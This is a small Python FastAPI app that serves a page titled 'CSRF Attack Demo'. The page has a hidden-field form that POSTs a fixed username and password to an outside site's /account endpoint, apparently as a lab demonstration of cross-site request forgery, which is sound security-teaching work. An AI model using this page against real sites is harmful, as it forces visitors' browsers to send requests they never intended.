from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from fastapi.responses import FileResponse

app = FastAPI()

@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    return FileResponse("favicon.ico")

@app.get("/", response_class=HTMLResponse)
async def read_root():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>CSRF Attack Demo</title>
    </head>
    <body>
        <h1>CSRF Attack Demo</h1>
        <form action="https://sktst-rental.onrender.com/account" method="POST">
            <input type="hidden" name="username" value="Orkennnnnnn">
            <input type="hidden" name="password" value="12qwaszx">
            <input type="submit" value="login">
        </form>
    </body>
    </html>
    """
